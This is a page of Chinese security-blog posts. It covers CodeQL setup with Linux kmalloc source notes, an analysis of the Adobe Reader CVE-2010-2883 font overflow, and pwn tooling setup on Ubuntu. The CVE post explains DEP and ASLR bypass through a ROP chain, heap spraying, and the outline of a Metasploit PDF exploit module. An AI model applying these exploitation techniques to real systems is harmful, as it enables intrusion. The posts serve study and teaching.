<p><img src="https://i.imgur.com/cRd4nPv.png"></p>
<blockquote>
<p>这里填写的路径是分析程序的路径</p>
<p>首先将下载的分析程序解压</p>
<p>将codeql.cmd这个文件所在的路径复制到框里</p>
</blockquote>
<h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><h3 id="利用codeql利用uaf："><a href="#利用codeql利用uaf：" class="headerlink" title="利用codeql利用uaf："></a>利用codeql利用uaf：</h3><p><a target="_blank" rel="noopener" href="https://vasco-jofra.github.io/articles/codeql-kernel">https://vasco-jofra.github.io/articles/codeql-kernel</a></p>
<h4 id="kmalloc-源码分析"><a href="#kmalloc-源码分析" class="headerlink" title="kmalloc()源码分析"></a>kmalloc()源码分析</h4><h5 id="slab-h"><a href="#slab-h" class="headerlink" title="slab.h"></a>slab.h</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">【file:/include/linux/slab.h】</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * kmalloc - allocate memory</span></span><br><span class="line"><span class="comment"> * @size: how many bytes of memory are required.//多少比特的内存被申请</span></span><br><span class="line"><span class="comment"> * @flags: the type of memory to allocate.//分配的内存的类型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * kmalloc is the normal method of allocating memory//kmalloc是一种用来分配内存的普通办法</span></span><br><span class="line"><span class="comment"> * for objects smaller than page size in the kernel.//对那些对象比页大小还小的</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The @flags argument may be one of://flag的值可能是下面的其中之一</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * %GFP_USER - Allocate memory on behalf of user.  May sleep.</span></span><br><span class="line"><span class="comment"> */</span>/为用户分配内存，可能会引起休眠</span><br><span class="line"> * %GFP_KERNEL - Allocate normal kernel ram.  May sleep.</span><br><span class="line"> *<span class="comment">//内核内存的常规分配，可能会引起休眠</span></span><br><span class="line"> * %GFP_ATOMIC - Allocation will <span class="keyword">not</span> sleep.  May use emergency pools.</span><br><span class="line"> *   For example, use <span class="keyword">this</span> inside interrupt handlers.</span><br><span class="line"> *<span class="comment">//该分配不会引起休眠,但可能会使用应急内存，通常用于中断处理中</span></span><br><span class="line"> * %GFP_HIGHUSER - Allocate pages from high memory.</span><br><span class="line"> *<span class="comment">//使用高端内存进行分配</span></span><br><span class="line"> * %GFP_NOIO - Do <span class="keyword">not</span> <span class="keyword">do</span> any I/O at all <span class="keyword">while</span> trying to get memory.</span><br><span class="line"> *<span class="comment">//分配内存时禁止任何IO操作</span></span><br><span class="line"> * %GFP_NOFS - Do <span class="keyword">not</span> make any fs calls <span class="keyword">while</span> trying to get memory.</span><br><span class="line"> *<span class="comment">//分配内存时，禁止任何文件系统操作</span></span><br><span class="line"> * %GFP_NOWAIT - Allocation will <span class="keyword">not</span> sleep.</span><br><span class="line"> *<span class="comment">//分配内存时禁止休眠</span></span><br><span class="line"> * %__GFP_THISNODE - Allocate node-local memory only.</span><br><span class="line"> *<span class="comment">//分配内存时，仅从本地节点内存中分配</span></span><br><span class="line"> * %GFP_DMA - Allocation suitable <span class="keyword">for</span> DMA.</span><br><span class="line"> *   Should only be used for kmalloc() caches. Otherwise, use a</span><br><span class="line"> *   slab created with SLAB_DMA.</span><br><span class="line"> *<span class="comment">//从DMA内存中分配合适的内存，应仅使用于kmalloc的cache分配；</span></span><br><span class="line"> * Also it is possible to <span class="built_in">set</span> different flags by OR<span class="number">&#x27;</span>ing</span><br><span class="line"> * in one <span class="keyword">or</span> more of the following additional @flags:</span><br><span class="line"> *</span><br><span class="line"> * %__GFP_COLD - Request cache-cold pages instead of</span><br><span class="line"> *   trying to <span class="keyword">return</span> cache-warm pages.</span><br><span class="line"> *<span class="comment">//用于请求分配冷热页中的冷页；</span></span><br><span class="line"> * %__GFP_HIGH - This allocation has high priority <span class="keyword">and</span> may use emergency pools.</span><br><span class="line"> *<span class="comment">//用于表示该分配优先级较高并可能会使用应急内存资源；</span></span><br><span class="line"> * %__GFP_NOFAIL - Indicate that <span class="keyword">this</span> allocation is in no way allowed to fail</span><br><span class="line"> *   (think twice before <span class="keyword">using</span>).</span><br><span class="line"> *<span class="comment">//用于指示该分配不允许分配失败，该标志需要慎用；</span></span><br><span class="line"> * %__GFP_NORETRY - If memory is <span class="keyword">not</span> immediately available,</span><br><span class="line"> *   then give up at once.</span><br><span class="line"> *<span class="comment">//如果分配内存未能够直接获取到，则不再尝试分配，直接放弃；</span></span><br><span class="line"> * %__GFP_NOWARN - If allocation fails, don<span class="number">&#x27;</span>t issue any warnings.</span><br><span class="line"> *<span class="comment">//如果分配过程中失败，不上报任何告警；</span></span><br><span class="line"> * %__GFP_REPEAT - If allocation fails initially, <span class="keyword">try</span> once more before failing.</span><br><span class="line"> *<span class="comment">//如果分配过程中失败，则尝试再次申请；</span></span><br><span class="line"> * There are other flags available as well, but these are <span class="keyword">not</span> intended</span><br><span class="line"> * <span class="keyword">for</span> general use, <span class="keyword">and</span> so are <span class="keyword">not</span> documented here. For a full <span class="built_in">list</span> of</span><br><span class="line"> * potential flags, always refer to linux/gfp.h.</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_constant_p(size)) &#123;<span class="comment">//__builtin_constant_p 是编译器gcc内置函数，用于判断一个值是否为编译时常量，如果是常数，函数返回1 ，否则返回0。此内置函数的典型用法是在宏中用于手动编译时优化。</span></span><br><span class="line">		<span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)<span class="comment">//（即申请空间超过kmalloc()所能分配最大cache的大小）</span></span><br><span class="line">			<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; GFP_DMA)) &#123;</span><br><span class="line">			<span class="keyword">int</span> index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!index)</span><br><span class="line">				<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> kmem_cache_alloc_trace(kmalloc_caches[index],</span><br><span class="line">					flags, size);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果通过kmalloc_large()进行内存分配，将会经kmalloc_large()-&gt;kmalloc_order()-&gt;__get_free_pages()，最终通过Buddy伙伴算法申请所需内存。</p>
</blockquote>
<h5 id="slub-c"><a href="#slub-c" class="headerlink" title="slub.c"></a>slub.c</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">【file:/mm/slub.c】</span><br><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))<span class="comment">//同样判断申请是否超过最大cache大小，如果是则通过kmalloc_large()进行分配</span></span><br><span class="line">		<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">	s = kmalloc_slab(size, flags);<span class="comment">//接着通过申请大小及申请标志调用kmalloc_slab()查找适用的kmem_cache；最后通过slab_alloc()进行slab分配。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">	ret = slab_alloc(s, flags, _RET_IP_);</span><br><span class="line"></span><br><span class="line">	trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为啥这里又判断一次是否申请超过最大cache大小？</p>
</blockquote>
<h5 id="kmalloc-slab"><a href="#kmalloc-slab" class="headerlink" title="kmalloc_slab()"></a>kmalloc_slab()</h5><p>可以来看下kmalloc_slab()的实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">【file:/mm/slab_commmon.c】</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Find the kmem_cache structure that serves a given size of</span></span><br><span class="line"><span class="comment"> * allocation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_SIZE)) &#123;</span><br><span class="line">		WARN_ON_ONCE(!(flags &amp; __GFP_NOWARN));</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!size)</span><br><span class="line">			<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">		index = size_index[size_index_elem(size)];</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		index = fls(size - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely((flags &amp; GFP_DMA)))</span><br><span class="line">		<span class="keyword">return</span> kmalloc_dma_caches[index];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">return</span> kmalloc_caches[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>如果申请的大小超过KMALLOC_MAX_SIZE最大值，则返回NULL表示失败；如果申请大小小于192,且不为0，将通过size_index_elem宏转换为下标后，经size_index全局数组取得索引值，否则将直接通过fls()取得索引值；最后如果开启了DMA内存配置且设置了GFP_DMA标志，将结合索引值通过kmalloc_dma_caches返回kmem_cache管理结构信息，否则将通过kmalloc_caches返回该结构。</p>
<p>由此可以看出kmalloc()实现较为简单，起分配所得的内存不仅是虚拟地址上的连续存储空间，同时也是物理地址上的连续存储空间。这是有别于后面将会分析到的vmalloc()申请所得的内存。</p>
</blockquote>
<h5 id="DMA内存分配"><a href="#DMA内存分配" class="headerlink" title="DMA内存分配"></a>DMA内存分配</h5><p>linux系统启动过程中，会初始化整个内核地址空间，将其划分为各个类型段，其中包括物理内存映射区(又称之为逻辑地址映射区)、虚拟内存分配区、高端页面映射区、系统保留映射区、DMA映射区(这个类似物理内存映射区，其映射的物理地址是连续的)这几个区域等等，linux内核在启动的时候通过arch/arm/include/asm/memory.h中的CONSISTENT_DMA_SIZE宏配置内核地址空间DMA大小。代码位置如下：</p>
<p>#ifndef CONSISTENT_DMA_SIZE<br>#define CONSISTENT_DMA_SIZE SZ_2M<br>#endif<br>CONSISTENT_DMA_SIZE 大小根据自己系统需求的情况来分配，比如做大数据高速采集一般这个DMA的值就应该设置大一些，否则在内核申请会报下面错误：</p>
<p>(NULL device <em>): dma_alloc_coherent size ****</em>  failed</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/17/cve-2010-2883-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/17/cve-2010-2883-2/" class="post-title-link" itemprop="url">cve-2010-2883-2</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-04-17 18:31:14 / Modified: 22:06:37" itemprop="dateCreated datePublished" datetime="2021-04-17T18:31:14+08:00">2021-04-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>DEP,数据执行保护，其基本原理是将数据所在内存页标识为不可执行。</p>
<p><img src="https://i.imgur.com/0qqIx33.png"></p>
<p>主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池执行代码）</p>
<p>DEP的保护对象是进程级别的，当某个进程的加载模块只要有一个模块不支持DEP，这个进程就不能贸然开启DEP，否则会发生异常。</p>
<p>Ret2libc：我们让程序跳转到一个已经存在的系统函数中，已经存在的系统函数必然存在于可执行页上，所以此时DEP是不会拦截的，Ret2libc的攻击原理也正是基于此。</p>
<p>三种比较有效的绕过DEP的exploit方法：</p>
<ol>
<li>通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行。</li>
<li>通过跳转到VirualProtect函数来将shellcode所在内存页设置为可执行状态，然后再转入shellcode执行。</li>
<li>通过跳转到VirualAlloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到这段内存中执行。</li>
</ol>
<h3 id="CreateFileA-功能-创建一个文件或设备"><a href="#CreateFileA-功能-创建一个文件或设备" class="headerlink" title="CreateFileA();功能:创建一个文件或设备"></a>CreateFileA();功能:创建一个文件或设备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0C0C0C24   4A801064  +-CALL 到 CreateFileA</span><br><span class="line">0C0C0C28   4A8522C8  | FileName &#x3D; &quot;iso88591&quot;    ; 创建一个名为iso88591的文件。</span><br><span class="line">0C0C0C2C   10000000  | Access &#x3D; GENERIC_ALL     ; 此文件访问权限为可读可写可执行。</span><br><span class="line">0C0C0C30   00000000  | ShareMode &#x3D; 0            ; 共享模式，0:阻止其他进程在请求删除，读取或写入访问权限时打开文件或设备。</span><br><span class="line">0C0C0C34   00000000  | pSecurity &#x3D; NULL         ; 此参数为NULL，则CreateFile返回的句柄，不能由应用程序可能创建的任何子进程继承，并且与返回的句柄关联的文件或设备将获取默认安全描述符。</span><br><span class="line">0C0C0C38   00000002  | Mode &#x3D; CREATE_ALWAYS     ; 始终创建一个新文件。</span><br><span class="line">0C0C0C3C   00000102  | Attributes &#x3D; HIDDEN|TEMPORARY    ; 文件属性：隐藏文件|临时文件</span><br><span class="line">0C0C0C40   00000000  +-hTemplateFile &#x3D; NULL     ; hTemplateFile为一个文件或设备句柄，表示按这个参数给出的句柄为模板创建文件。通常这个参数设置为NULL，为空表示不使用模板，一般为空。</span><br></pre></td></tr></table></figure>
<p>0C0C0C2C   10000000  | Access = GENERIC_ALL     ; 此文件访问权限为可读可写可执行。</p>
<p><img src="https://i.imgur.com/INBRrc4.png"></p>
<blockquote>
<p>注意是从0开始的，0x10000000转换为二进制就是1000000000000000000000000000，29是1。从0开始就是28.</p>
</blockquote>
<p>winhex中 00001f90机器码是58</p>
<p>rasm2 -a x86 -d 58可以看到是pop eax</p>
<p><img src="https://i.imgur.com/Qy96sES.png"></p>
<p>由于DEP的实施,不能直接跳到nop进行执行，需要先进行ROP使得shellcode得到执行，所以我们需要预测rop链的准确位置，由于内存分配是对齐的，这意味着如果我们用正确的大小的块，和正确的大小的喷射块，我们将确保每个喷射块开始，将在可预见的地址定位。再通过简单的计算，可以实现准确喷射。</p>
<p> 最后调用<code>memcopy</code>的时候，<code>目的地址</code>就是前面<code>MapViewOfFile()</code>返回的<code>文件映射基地址</code>，而<code>源地址</code>就是真正的<code>shellcode</code>代码，将它<code>复制</code>到一段<code>可执行可读写的内存段</code>，以此<code>绕过DEP</code>。由于构造的<code>ROP指令</code>均位于不受<code>ASLR</code>保护的<code>icucnv36.dll</code>模块，因此也可以<code>绕过ASLR保护</code>。正是由于<code>DEP</code>的存在，所以<code>堆栈空间</code>是不存在<code>可执行权限</code>的，所以，我们需要创建一个<code>文件映射对象</code>，将其<code>映射</code>到<code>可读可写可执行的内存块</code>，再把shellcode拷贝到那里，就可以执行了。</p>
<p>解码完<code>shellcode</code>,然后通过<code>TEB</code>、<code>PEB</code>等结构计算出<code>WinExec()</code>函数的地址,调用<code>WinExec(&quot;calc.exe&quot;,0x1)</code>弹出计算器。计算<code>库函数API地址</code>的shellcode使用的是<code>metasploit-framework</code>中的<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm">block_api.asm</a>,此版本为<code>最新版本</code>,近期<code>更新</code>过,与<code>样本</code>中的有些许差别。</p>
<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit()"></a>exploit()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def exploit</span><br><span class="line">    ttf_data &#x3D; make_ttf() # 构造ttf字体数据,SING表内容就在其中</span><br><span class="line"></span><br><span class="line">    js_data &#x3D; make_js(payload.encoded) # 构建Heap Spary js代码,ROP Chain及Payload就包含在里面</span><br><span class="line"></span><br><span class="line">    # Create the pdf</span><br><span class="line">    pdf &#x3D; make_pdf(ttf_data, js_data) # 构造pdf文件数据,将前面构造好的ttf字体数据和js代码放入其中</span><br><span class="line"></span><br><span class="line">    print_status(&quot;Creating &#39;#&#123;datastore[&#39;FILENAME&#39;]&#125;&#39; file...&quot;)</span><br><span class="line"></span><br><span class="line">    file_create(pdf) # 创建pdf文件</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<h4 id="make-ttf"><a href="#make-ttf" class="headerlink" title="make_ttf()"></a>make_ttf()</h4><p>  此函数首先打开了一个<code>正常的ttf模板</code>文件,然后构造了<code>SING表</code>数据,将<code>ttf字体</code>文件中的<code>name表</code>数据替换为<code>构造的SING表</code>数据,<code>“name”</code>字符串替换为<code>“SING”</code>。<code>构造的SING表数据</code>包括用于将程序控制流劫持到<code>Heap Spary代码</code>处执行的<code>ROP Chain</code>,以及溢出后、获得程序控制流之前,用于绕过<code>造成程序执行出错</code>的数据。</p>
<h4 id="make-js"><a href="#make-js" class="headerlink" title="make_js()"></a>make_js()</h4><p>  此函数的功能将j<code>avascript的代码</code>转换为<code>字符串</code>,并将javascript的<code>变量名</code>进行<code>混淆</code>。javascript的代码用于<code>堆喷</code>,所以我们应将用于将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>以及<code>经过编码的Payload</code>编入其中。将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>的细节前面讲过了,就不说了。</p>
<h4 id="make-pdf"><a href="#make-pdf" class="headerlink" title="make_pdf()"></a>make_pdf()</h4><p>  此函数一步一步构造<code>pdf</code>中的每一个<code>obj</code>,将<code>ttf字体数据</code>和<code>javascript代码</code>分别放在了<code>obj10</code>和<code>obj12</code>,然后在<code>obj1</code>中设置<code>/OpenAction 11 0 R</code>,使pdf文件<code>打开</code>时,<code>javascript</code>能够被执行,从而实现<code>Heap Spary</code>。还构造了<code>obj13</code>,使<code>icucnv36.dll</code>能够被加载。因为,<code>exp</code>中使用的<code>ROPgadget</code>都是出自<code>icucnv36.dll</code>模块的,所以其必须要<code>被加载到内存</code>中。</p>
<h3 id="TEB-PEB"><a href="#TEB-PEB" class="headerlink" title="TEB\PEB"></a>TEB\PEB</h3><p>一个可执行文件被OS加载到内存，并处理完成相关的模块加载，导入表处理……及其他必须处理后，形成一个进程。在OS内核中保存有一份关于这个进程的身份证信息，就是平常看到的HANDLE，叫进程句柄。</p>
<p>TEB偏移0x30处是本进程的PEB结构体指针，通过这个指针即可取得PEB的地址，从而继续读取更多的关于本进程的一些信息。</p>
<p>PEB(Process Environment Block，进程环境块)：存放进程信息，准确的PEB地址应该从系统的EXPROCESS结构的0x1b0偏移出获得，但这个结构位于系统地址空间，访问 需要 ring0权限，所以一般通过TEB结构的偏移0x30处获取PEB.</p>
<pre><code>获取peb代码：mov eax, fs:[0x30]  

     mov PEB, eax
</code></pre>
<p>TEB(Thread Environment Block，线程环境块)： 存放线程信息，位于用户地址空间，进程中的每个线程都有自己的一个TEB.通过fs寄存器来访问，一般储存在fs:[0].</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/12/pwn-environment-layout/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/04/12/pwn-environment-layout/" class="post-title-link" itemprop="url">pwn-environment-layout</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-04-12 17:20:31" itemprop="dateCreated datePublished" datetime="2021-04-12T17:20:31+08:00">2021-04-12</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-04-25 10:07:40" itemprop="dateModified" datetime="2021-04-25T10:07:40+08:00">2021-04-25</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="pwn环境布置"><a href="#pwn环境布置" class="headerlink" title="pwn环境布置"></a>pwn环境布置</h1><h2 id="ubuntu18-04安装："><a href="#ubuntu18-04安装：" class="headerlink" title="ubuntu18.04安装："></a>ubuntu18.04安装：</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/38797088">VMware安装Ubuntu18.04（必会） - 知乎 (zhihu.com)</a></p>
<h2 id="给ubuntu18-04换源"><a href="#给ubuntu18-04换源" class="headerlink" title="给ubuntu18.04换源"></a>给ubuntu18.04换源</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiangxianghehe/article/details/80112149">Ubuntu 18.04换国内源 中科大源 阿里源 163源 清华源_xiangxianghehe的博客-CSDN博客</a></p>
<p>(注意没有权限记得sudo)</p>
<h2 id="安装编译Python源程序所需的包"><a href="#安装编译Python源程序所需的包" class="headerlink" title="安装编译Python源程序所需的包"></a>安装编译Python源程序所需的包</h2><p>sudo apt install build-essential -y<br>sudo apt install libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev -y<br>sudo apt-get install zlib1g-dev</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42261208/article/details/105227474">ubuntu18.04 pwn环境搭建_winterze的博客-CSDN博客</a></p>
<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p>sudo apt install git</p>
<h3 id="进行git配置"><a href="#进行git配置" class="headerlink" title="进行git配置"></a>进行git配置</h3><p>sudo git config –global user.name ‘自定义用户名’<br>sudo git config –global user.email ‘邮箱’</p>
<h2 id="Pwn常用软件（python2）"><a href="#Pwn常用软件（python2）" class="headerlink" title="Pwn常用软件（python2）"></a>Pwn常用软件（python2）</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>sudo apt-get install python python-pip python-dev libssl-dev libffi-dev build-essential</p>
<p>sudo pip install -U setuptools</p>
<p>sudo pip install –upgrade pip</p>
<p>sudo pip install –upgrade pwntools</p>
<p>测试：</p>
<p>import pwn<br>pwn.asm(“xor eax,eax”)<br>b’1\xc0’</p>
<p>（配置过程中遇到问题 python-tox 不匹配，用了以下命令解决<br>sudo pip install six –user -U<br>sudo pip install ipython –user -U）</p>
<h3 id="安装gdb"><a href="#安装gdb" class="headerlink" title="安装gdb"></a>安装gdb</h3><p>sudo apt-get install gdb</p>
<h3 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a></p>
<p> cd pwndbg </p>
<p>sudo ./setup.sh</p>
<h3 id="安装peda："><a href="#安装peda：" class="headerlink" title="安装peda："></a>安装peda：</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~/peda</p>
<p>echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit</p>
<h3 id="32位程序支持"><a href="#32位程序支持" class="headerlink" title="32位程序支持"></a>32位程序支持</h3><p>sudo apt-get install libc6-dev-i386</p>
<h3 id="32位依赖库"><a href="#32位依赖库" class="headerlink" title="32位依赖库"></a>32位依赖库</h3><p>sudo apt-get install lib32ncurses5</p>
<p>sudo apt-get install lib32z1</p>
<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a> </p>
<p>cd LibcSearcher </p>
<p>sudo python setup.py develop</p>
